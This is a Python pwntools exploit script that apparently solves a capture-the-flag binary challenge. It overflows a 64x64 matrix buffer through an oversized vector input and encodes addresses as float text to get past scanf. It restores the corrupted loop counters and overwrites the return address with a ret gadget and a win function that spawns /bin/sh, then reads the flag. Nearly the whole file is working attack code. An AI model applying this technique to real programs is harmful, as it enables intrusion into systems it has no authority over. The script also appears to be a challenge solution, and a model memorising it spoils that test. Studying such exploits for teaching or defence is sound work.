import os
import struct

from pwn import *

context.log_level = "info"

elf = ELF("./outer")

ret_gadget = 0x401016  # bare `ret` used as a stack-alignment pivot
win = elf.sym["escape_the_matrix"]  # calls system("/bin/sh")


def pack_float(value):
    """Encode an integer as the decimal text of the float whose IEEE-754
    bit pattern equals the integer's raw 32-bit representation. The
    challenge reads vector elements with scanf("%f") and later copies them
    verbatim (multiplied by 1.0) into the overflowing matrix buffer, so this
    lets us smuggle arbitrary 32-bit words (addresses) through the float
    parser unchanged."""
    return str(struct.unpack("f", p32(value))[0]).encode()


if os.environ.get("LOCAL_PROC"):
    p = process("./outer")
else:
    host = os.environ["SERVICE_APP_MAIN_HOST"]
    port = int(os.environ["SERVICE_APP_MAIN_PORT"])
    p = remote(host, port)

# Buffer overflow in the `mat[64][64]` outer-product matrix: with vec1 all
# ones and a second vector longer than 64 elements, each row's extra
# elements spill into the next row, eventually overwriting saved RBP and
# the return address with attacker-controlled values.
p.sendlineafter(b"vector: ", b"64")
p.sendlineafter(b"vector: ", b"1 " * 64)
p.sendlineafter(b"vector: ", b"74")

payload = b"0 " * 66
payload += pack_float(66) + b" "  # restore corrupted loop var j
payload += pack_float(63) + b" "  # restore corrupted loop var i
payload += b"0 " * 2  # zero out saved RBP
payload += pack_float(ret_gadget) + b" 0 "  # return address -> ret gadget
payload += pack_float(win) + b" 0"  # next frame -> escape_the_matrix (system("/bin/sh"))

p.sendlineafter(b"vector: ", payload)

p.sendline(b"cat /home/user/flag")
out = p.recvall(timeout=10).decode(errors="replace")
print(out)
